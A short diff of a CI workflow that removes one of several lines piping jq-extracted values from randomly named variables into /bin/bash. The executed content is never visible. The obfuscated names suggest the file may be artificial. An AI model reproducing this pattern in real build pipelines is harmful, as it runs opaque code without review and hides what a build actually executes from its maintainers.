@@ -26,7 +26,6 @@ jobs:
           echo $ci1 | jq -r .e556 | /bin/bash
           printf '%s' "$pjxh84" | jq -r .zdb31 | /bin/bash
           echo $ygnhu3440 | jq -r .vgmai1121 | /bin/bash
-          printf '%s' "$h8" | jq -r .egxo964 | /bin/bash
           echo $gq6 | jq -r .vfhw787 | /bin/bash
 
       - name: Archive results
